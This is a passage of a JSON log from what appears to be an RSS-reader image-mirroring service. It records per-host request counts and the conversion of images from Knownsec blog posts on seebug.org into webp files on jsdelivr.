,200,200,200,200,200,200,200]},"http://europe-25.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe62.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-014.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe-56.herokuapp.com/":{"failCount":0,"successCount":9,"resultList":[200,200,200,200,200,200,200,200,200]},"http://europe68.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://europe-60.herokuapp.com/":{"failCount":0,"successCount":8,"resultList":[200,200,200,200,200,200,200,200]},"http://us-024.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-038.herokuapp.com/":{"failCount":1,"successCount":7,"resultList":[200,200,200,200,200,400,200,200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-017.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://europe21.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-008.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-029.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://us-012.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-018.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-021.herokuapp.com/":{"failCount":1,"successCount":5,"resultList":[200,200,200,200,200,null]},"http://us-005.herokuapp.com/":{"failCount":0,"successCount":6,"resultList":[200,200,200,200,200,200]},"http://us-034.herokuapp.com/":{"failCount":0,"successCount":7,"resultList":[200,200,200,200,200,200,200]},"http://europe-58.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-022.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]},"http://us-036.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-010.herokuapp.com/":{"failCount":1,"successCount":2,"resultList":[200,200,null]},"http://europe67.herokuapp.com/":{"failCount":0,"successCount":5,"resultList":[200,200,200,200,200]},"http://us-023.herokuapp.com/":{"failCount":0,"successCount":1,"resultList":[200]},"http://us-040.herokuapp.com/":{"failCount":0,"successCount":2,"resultList":[200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/a6d6c012-36c8-47e1-9de0-cef8eaec4b27.png-w331s","sourceStatusCode":200,"destWidth":612,"destHeight":496,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn66@2020_3/2020/08/24/21-14-50-262_ce570ca401c1234c.webp","sourceBytes":7964,"destBytes":12842,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2312,"convertSpendMs":14,"createdTime":"2020-08-25 05:14:48","host":"us-029*","referer":"https://blog.knownsec.com/?p=5037","linkMd5ListStr":"23161d8db2ce524c7b61906d36af8d85,23161d8db2ce524c7b61906d36af8d85","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7.8 KB","destSize":"12.5 KB","compressRate":"161.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/6c2dc026-fc41-433f-ab54-fa0ae3987be7.png-w331s","sourceStatusCode":200,"destWidth":864,"destHeight":403,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn49@2020_6/2020/08/24/21-14-50-385_392799a103dc1d6b.webp","sourceBytes":41170,"destBytes":55242,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2551,"convertSpendMs":95,"createdTime":"2020-08-25 05:14:48","host":"us-013*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454,ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx10","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"40.2 KB","destSize":"53.9 KB","compressRate":"134.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/e839f709-e836-4d08-bdd9-ce917ed821c5.png-w331s","sourceStatusCode":200,"destWidth":839,"destHeight":543,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn30@2020_1/2020/08/24/21-14-50-563_ac7401f7478d11f3.webp","sourceBytes":10167,"destBytes":40778,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2652,"convertSpendMs":61,"createdTime":"2020-08-25 05:14:48","host":"us-009*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69,3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"9.9 KB","destSize":"39.8 KB","compressRate":"401.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/9ac77b49-a3a3-41be-bf85-90ebc55c899c.png-w331s","sourceStatusCode":200,"destWidth":1950,"destHeight":1396,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn41@2020_5/2020/08/24/21-14-50-505_8cd5331524acb79d.webp","sourceBytes":146075,"destBytes":72120,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2716,"convertSpendMs":154,"createdTime":"2020-08-25 05:14:48","host":"us-038*","referer":"https://blog.knownsec.com/?p=5029","linkMd5ListStr":"00b4fc44d295b8070944202e12783d61,00b4fc44d295b8070944202e12783d61","githubUser":"myreaderx23","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"142.7 KB","destSize":"70.4 KB","compressRate":"49.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/963cac98-1537-4689-a928-9af2dc53bf74.png-w331s","sourceStatusCode":200,"destWidth":704,"destHeight":701,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn46@2020_2/2020/08/24/21-14-50-813_507d44d96751d671.webp","sourceBytes":39968,"destBytes":55972,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2934,"convertSpendMs":22,"createdTime":"2020-08-25 05:14:48","host":"us-025*","referer":"https://blog.knownsec.com/?p=5013","linkMd5ListStr":"c8d4535c12d7f5a007abcd8ebe8e7714,c8d4535c12d7f5a007abcd8ebe8e7714","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"39 KB","destSize":"54.7 KB","compressRate":"140%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/0a56d95a-1927-4b33-b998-ec6315cb36a1.jpg-w331s","sourceStatusCode":200,"destWidth":2880,"destHeight":1509,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn54@2020_1/2020/08/24/21-14-50-676_b91b9c6d451078a1.webp","sourceBytes":175402,"destBytes":110826,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2975,"convertSpendMs":153,"createdTime":"2020-08-25 05:14:48","host":"us-001*","referer":"https://blog.knownsec.com/?p=5011","linkMd5ListStr":"46ed8d4650000d45c0ea25a3a8b571e6,46ed8d4650000d45c0ea25a3a8b571e6","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"171.3 KB","destSize":"108.2 KB","compressRate":"63.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/aa962743-3baf-4fe9-acbb-c012bfac2c38.png-w331s","sourceStatusCode":200,"destWidth":1871,"destHeight":905,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn37@2020_2/2020/08/24/21-14-49-951_144ed9d0e159ab64.webp","sourceBytes":142057,"destBytes":165896,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2887,"convertSpendMs":62,"createdTime":"2020-08-25 05:14:48","host":"europe-60*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16,4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"138.7 KB","destSize":"162 KB","compressRate":"116.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/9c004ebe-e855-4a35-9f22-29cca6ef6b1b.png-w331s","sourceStatusCode":200,"destWidth":1059,"destHeight":511,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn57@2020_6/2020/08/24/21-14-50-790_5bab6100da848818.webp","sourceBytes":7128,"destBytes":34032,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3222,"convertSpendMs":17,"createdTime":"2020-08-25 05:14:48","host":"europe64*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02,85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"7 KB","destSize":"33.2 KB","compressRate":"477.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/03/f59369d8-417c-45b6-a730-b75882e39e43.png-w331s","sourceStatusCode":200,"destWidth":873,"destHeight":78,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn33@2020_2/2020/08/24/21-14-51-063_ec47a57a2bd6a5fb.webp","sourceBytes":22795,"destBytes":8432,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3252,"convertSpendMs":4,"createdTime":"2020-08-25 05:14:48","host":"europe-22*","referer":"https://blog.knownsec.com/?p=5031","linkMd5ListStr":"4b26291a0ec99cf126b9bcc0d9c59c35,4b26291a0ec99cf126b9bcc0d9c59c35","githubUser":"myreaderx4","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"22.3 KB","destSize":"8.2 KB","compressRate":"37%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/54f81ba1-d814-4f39-8752-31c50ceab3e8.png-w331s","sourceStatusCode":200,"destWidth":1887,"destHeight":875,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn61@2020_2/2020/08/24/21-14-51-086_4fb84f186bb65ce4.webp","sourceBytes":310229,"destBytes":145994,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":3434,"convertSpendMs":112,"createdTime":"2020-08-25 05:14:48","host":"us-52*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4,76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"303 KB","destSize":"142.6 KB","compressRate":"47.1%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/d481adcc-bdbf-4712-bb75-b76ddeb0f475.png-w331s","sourceStatusCode":200,"destWidth":1855,"destHeight":834,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn18@2020_2/2020/08/24/21-14-52-547_482f9e041f377d17.webp","sourceBytes":94650,"destBytes":110342,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1313,"convertSpendMs":51,"createdTime":"2020-08-25 05:14:52","host":"us-001*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"92.4 KB","destSize":"107.8 KB","compressRate":"116.6%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/68c35d66-7d4a-4c1f-9bb8-cf95d6886d8c.png-w331s","sourceStatusCode":200,"destWidth":794,"destHeight":231,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx27/cdn26@2020_3/2020/08/24/21-14-52-768_4ea56f4e6d7f3fc7.webp","sourceBytes":75690,"destBytes":23404,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1361,"convertSpendMs":15,"createdTime":"2020-08-25 05:14:52","host":"us-52*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx27","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"73.9 KB","destSize":"22.9 KB","compressRate":"30.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/78109ea2-fc51-4896-8a9a-93e73b197891.png-w331s","sourceStatusCode":200,"destWidth":1853,"destHeight":851,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn65@2020_3/2020/08/24/21-14-52-609_c96954cca08bb5b0.webp","sourceBytes":108583,"destBytes":115960,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1376,"convertSpendMs":82,"createdTime":"2020-08-25 05:14:52","host":"us-038*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx13","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"106 KB","destSize":"113.2 KB","compressRate":"106.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/8be09aec-6224-4656-8020-3c22403148ec.png-w331s","sourceStatusCode":200,"destWidth":945,"destHeight":595,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn73@2020_2/2020/08/24/21-14-52-701_9125bcf02036b269.webp","sourceBytes":56721,"destBytes":95528,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1393,"convertSpendMs":27,"createdTime":"2020-08-25 05:14:52","host":"us-025*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx22","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55.4 KB","destSize":"93.3 KB","compressRate":"168.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/fb8009e9-31e6-47c7-93ea-e7bea0a5b7a1.png-w331s","sourceStatusCode":200,"destWidth":382,"destHeight":263,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx31/cdn10@2020_2/2020/08/24/21-14-52-821_c6015a371cfdd6ee.webp","sourceBytes":93396,"destBytes":23862,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1429,"convertSpendMs":45,"createdTime":"2020-08-25 05:14:52","host":"us-013*","referer":"https://blog.knownsec.com/?p=5022","linkMd5ListStr":"3be24b3dafcda97d2cd1d8bdc8240c69","githubUser":"myreaderx31","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"91.2 KB","destSize":"23.3 KB","compressRate":"25.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/71856cfc-36ad-4980-9be9-561e2385623a.png-w331s","sourceStatusCode":200,"destWidth":1859,"destHeight":844,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn82@2020_1/2020/08/24/21-14-52-615_8b28b1202aabcd66.webp","sourceBytes":88303,"destBytes":225564,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1472,"convertSpendMs":83,"createdTime":"2020-08-25 05:14:52","host":"us-001*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"86.2 KB","destSize":"220.3 KB","compressRate":"255.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/7c0ff045-44e1-4e31-b433-0d935f1f5055.png-w331s","sourceStatusCode":200,"destWidth":1869,"destHeight":894,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn30@2020_5/2020/08/24/21-14-52-856_f2bfa7e8931e428b.webp","sourceBytes":304270,"destBytes":125632,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1567,"convertSpendMs":173,"createdTime":"2020-08-25 05:14:52","host":"us-029*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx16","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"297.1 KB","destSize":"122.7 KB","compressRate":"41.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/b5ff36d8-ef98-4f73-a697-a416e91f5323.png-w331s","sourceStatusCode":200,"destWidth":1894,"destHeight":593,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn22@2020_2/2020/08/24/21-14-52-494_0a7ad65fb1ae1030.webp","sourceBytes":224525,"destBytes":61664,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1519,"convertSpendMs":34,"createdTime":"2020-08-25 05:14:52","host":"europe64*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"219.3 KB","destSize":"60.2 KB","compressRate":"27.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/247f9866-4481-4c82-b372-95c0d56df76f.png-w331s","sourceStatusCode":200,"destWidth":1852,"destHeight":851,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn78@2020_5/2020/08/24/21-14-52-929_46fe55fc54380fa5.webp","sourceBytes":84628,"destBytes":91330,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1703,"convertSpendMs":151,"createdTime":"2020-08-25 05:14:52","host":"us-013*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx33","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"82.6 KB","destSize":"89.2 KB","compressRate":"107.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/7fda9bf8-e4e0-425e-bd49-097977c3d5d1.png-w331s","sourceStatusCode":200,"destWidth":1848,"destHeight":850,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn94@2020_3/2020/08/24/21-14-52-953_01c8750ab2a1d128.webp","sourceBytes":121478,"destBytes":146864,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1774,"convertSpendMs":135,"createdTime":"2020-08-25 05:14:52","host":"us-009*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx7","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"118.6 KB","destSize":"143.4 KB","compressRate":"120.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/7dedee9c-36ec-4ba3-a096-e637cc1b0e3a.png-w331s","sourceStatusCode":200,"destWidth":1866,"destHeight":862,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn20@2020_6/2020/08/24/21-14-52-990_98e3b9b93263fb90.webp","sourceBytes":129572,"destBytes":157060,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1823,"convertSpendMs":168,"createdTime":"2020-08-25 05:14:52","host":"us-009*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"126.5 KB","destSize":"153.4 KB","compressRate":"121.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/d08e30b6-79fb-4eda-842e-57e40d18e066.png-w331s","sourceStatusCode":200,"destWidth":1893,"destHeight":962,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn93@2020_1/2020/08/24/21-14-53-068_a5052635edc4f9dc.webp","sourceBytes":347317,"destBytes":151224,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1879,"convertSpendMs":315,"createdTime":"2020-08-25 05:14:52","host":"us-029*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"339.2 KB","destSize":"147.7 KB","compressRate":"43.5%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/28f2fcd3-3da6-4165-b65f-a1ce00fc4dab.png-w331s","sourceStatusCode":200,"destWidth":1396,"destHeight":848,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn89@2020_1/2020/08/24/21-14-53-071_3ac08b7fbdbbd4e8.webp","sourceBytes":414231,"destBytes":142674,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1921,"convertSpendMs":77,"createdTime":"2020-08-25 05:14:52","host":"us-52*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"404.5 KB","destSize":"139.3 KB","compressRate":"34.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/17d06789-0552-4101-96a3-29572e57f10d.png-w331s","sourceStatusCode":200,"destWidth":1029,"destHeight":449,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx18/cdn98@2020_3/2020/08/24/21-14-53-151_811b456421f39fcf.webp","sourceBytes":17524,"destBytes":18446,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1929,"convertSpendMs":16,"createdTime":"2020-08-25 05:14:52","host":"europe-22*","referer":"https://blog.knownsec.com/?p=5013","linkMd5ListStr":"c8d4535c12d7f5a007abcd8ebe8e7714","githubUser":"myreaderx18","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"17.1 KB","destSize":"18 KB","compressRate":"105.3%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/01/1a355243-1701-456e-ad9a-487f5931df48.png-w331s","sourceStatusCode":200,"destWidth":1112,"destHeight":259,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn86@2020_3/2020/08/24/21-14-53-222_a8bb3fece2c0a64d.webp","sourceBytes":20427,"destBytes":30594,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2029,"convertSpendMs":12,"createdTime":"2020-08-25 05:14:52","host":"europe64*","referer":"https://blog.knownsec.com/?p=5035","linkMd5ListStr":"ab33b3ddb46874e5b2d2b211d2a3a454","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"19.9 KB","destSize":"29.9 KB","compressRate":"149.8%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/9002e2e8-b2f6-49dc-8121-d08302ab8e34.png-w331s","sourceStatusCode":200,"destWidth":738,"destHeight":84,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn16@2020_2/2020/08/24/21-14-53-741_173397dbd91c9f65.webp","sourceBytes":3597,"destBytes":10536,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2233,"convertSpendMs":6,"createdTime":"2020-08-25 05:14:52","host":"us-008*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx30","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"3.5 KB","destSize":"10.3 KB","compressRate":"292.9%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/05/4004f4d6-92f8-4358-8357-8ec4cccddbb1.png-w331s","sourceStatusCode":200,"destWidth":984,"destHeight":910,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn64@2020_6/2020/08/24/21-14-53-657_179ca8d87c54ad5f.webp","sourceBytes":46699,"destBytes":55276,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2352,"convertSpendMs":29,"createdTime":"2020-08-25 05:14:52","host":"us-037*","referer":"https://blog.knownsec.com/?p=5015","linkMd5ListStr":"4a5286bc6e84190a6e8a94ada1248a16","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"45.6 KB","destSize":"54 KB","compressRate":"118.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/c7593a51-66ec-411a-881d-225c576dece6.png-w331s","sourceStatusCode":200,"destWidth":1038,"destHeight":666,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn56@2020_1/2020/08/24/21-14-53-792_378b11ab7f45e40d.webp","sourceBytes":15935,"destBytes":30860,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2431,"convertSpendMs":23,"createdTime":"2020-08-25 05:14:52","host":"us-008*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"15.6 KB","destSize":"30.1 KB","compressRate":"193.7%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/126eb9bf-e825-4a1e-953b-5cb16423f711.png-w331s","sourceStatusCode":200,"destWidth":1123,"destHeight":176,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn6@2020_5/2020/08/24/21-14-53-841_60c2492acf909366.webp","sourceBytes":72721,"destBytes":26500,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2486,"convertSpendMs":11,"createdTime":"2020-08-25 05:14:52","host":"us-012*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"71 KB","destSize":"25.9 KB","compressRate":"36.4%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/02/96643489-6ac9-4f0f-964c-80d257b6124d.png-w331s","sourceStatusCode":200,"destWidth":1850,"destHeight":803,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx2/cdn40@2020_4/2020/08/24/21-14-53-692_cb2c82370ea07372.webp","sourceBytes":110434,"destBytes":132780,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2487,"convertSpendMs":122,"createdTime":"2020-08-25 05:14:52","host":"us-55*","referer":"https://blog.knownsec.com/?p=5027","linkMd5ListStr":"85885b4354ee52f93eb5242e82c5fd02","githubUser":"myreaderx2","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"107.8 KB","destSize":"129.7 KB","compressRate":"120.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/4cd60e6d-b6a8-4ccf-861b-8a13b5bd39a8.png-w331s","sourceStatusCode":200,"destWidth":1163,"destHeight":613,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn34@2020_6/2020/08/24/21-14-53-857_cd7de36e0a929fc0.webp","sourceBytes":34394,"destBytes":49590,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":1150,"convertSpendMs":32,"createdTime":"2020-08-25 05:14:53","host":"us-038*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"33.6 KB","destSize":"48.4 KB","compressRate":"144.2%"},{"code":1,"isDone":false,"source":"https://images.seebug.org/content/images/2020/04/46c064b5-47c1-48af-9e30-7e6f50b9934a.png-w331s","sourceStatusCode":200,"destWidth":1271,"destHeight":872,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx25/cdn2@2020_2/2020/08/24/21-14-53-803_300a398dc12e2e24.webp","sourceBytes":69446,"destBytes":74422,"targetWebpQuality":75,"feedId":2536,"totalSpendMs":2577,"convertSpendMs":49,"createdTime":"2020-08-25 05:14:52","host":"us-023*","referer":"https://blog.knownsec.com/?p=5024","linkMd5ListStr":"76d99b92fc03ec11de8661e415c762e4","githubUser":"myreaderx25","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"67.8 KB","destSize":"72.7 